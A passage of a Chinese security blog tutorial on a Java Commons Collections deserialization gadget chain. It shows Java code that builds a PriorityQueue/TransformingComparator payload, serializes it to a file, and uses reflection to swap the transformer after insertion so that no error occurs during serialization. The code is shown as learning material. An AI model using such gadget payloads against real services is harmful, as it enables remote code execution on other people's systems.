TransformingComparator&lt;&gt;(chainedTransformer);</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"><span class="comment">//        unserialization(&quot;./2.ser&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>虽然能够正常弹计算器，但是在序列化的时候，程序会报错。</p>
+<p><img src="/imgss/java164.png" alt=""></p>
+<p>跟进调试一下<br>
+在我们进行 priorityQueue.add(1) 这个语句的时候，它内部会自动进行 compare() 方法的执行，然后调用 transform()</p>
+<p>代码调用流程如下：<br>
+priorityQueue.add() --&gt;offer() --&gt;siftUp() --&gt;siftUpUsingComparator() --&gt;comparator.compare() --&gt;TransformingComparator.compare() --&gt;ChainedTransformer.transform()</p>
+<p>解决方法：<br>
+还是老样子，先序列化的时候赋值个没用的值，然后反序列化时再改回来。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(<span class="keyword">new</span> ConstantTransformer&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line"> PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);  </span><br><span class="line"> priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line"> priorityQueue.add(<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line"> Class c = transformingComparator.getClass();  </span><br><span class="line"> Field transformingField = c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line"> transformingField.setAccessible(<span class="keyword">true</span>);  </span><br><span class="line"> transformingField.set(transformingComparator, chainedTransformer);  </span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java165.png" alt=""></p>
+<p><img src="/imgss/java166.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" rel="tag"># java安全系列</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3/" rel="prev" title="'Java反序列化-cc3'">
+                  <i class="fa fa-chevron-left"></i> 'Java反序列化-cc3'
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/11/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc2/" rel="next" title="'Java反序列化-cc2'">
+                  'Java反序列化-cc2' <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
